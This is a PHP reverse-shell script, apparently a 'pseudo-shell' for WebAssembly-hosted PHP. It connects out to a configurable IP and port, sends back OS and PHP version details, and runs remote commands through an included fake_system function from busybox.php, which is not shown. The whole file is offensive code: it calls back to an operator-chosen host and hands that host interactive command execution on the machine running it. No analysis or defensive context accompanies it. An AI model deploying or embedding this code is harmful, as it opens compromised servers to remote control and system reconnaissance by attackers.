<?php
// Include busybox for all fake commands
require_once 'busybox.php';

$ip = $GLOBALS['rev_ip'] ?? '127.0.0.1';
$port = $GLOBALS['rev_port'] ?? 4444;

$sock = @fsockopen($ip, $port, $errno, $errstr, 5);
if (!$sock) { exit("Connessione fallita: $errstr\n"); }

// 1. Informazioni di sistema iniziali
fputs($sock, "=== WASM Advanced Pseudo-Shell ===\n");
fputs($sock, "OS Info: " . php_uname() . "\n");
fputs($sock, "PHP Version: " . phpversion() . "\n\n");

// 2. Mantenimento dello stato (Directory Corrente)
$cwd = getcwd() ?: '/';

while (!feof($sock)) {
    // Prompt realistico: user@hostname:path$
    $prompt = "wasm-user@" . gethostname() . ":" . $cwd . "$ ";
    fputs($sock, $prompt);
    
    $input = fgets($sock);
    if ($input === false) break;
    
    $input = trim($input);
    if ($input === '') continue;
    if ($input === 'exit' || $input === 'quit') break;

    // Handle special commands that need state management
    if (preg_match('/^cd\s+(.*)$/', $input, $m)) {
        $target = trim($m[1]) ?: '/';
        $new_dir = (strpos($target, '/') === 0) ? $target : $cwd . '/' . $target;
        $new_dir = realpath($new_dir);
        
        if ($new_dir && is_dir($new_dir)) {
            $cwd = $new_dir;
            chdir($cwd);
            fputs($sock, "");
        } else {
            fputs($sock, "-bash: cd: $target: No such file or directory\n");
        }
        continue;
    }
    
    // Use busybox fake_system for all other commands
    ob_start();
    try {
        fake_system($input);
    } catch (Throwable $e) {
        echo "Error: " . $e->getMessage() . "\n";
    }
    
    $output = ob_get_clean();
    fputs($sock, $output);
}
fclose($sock);
?>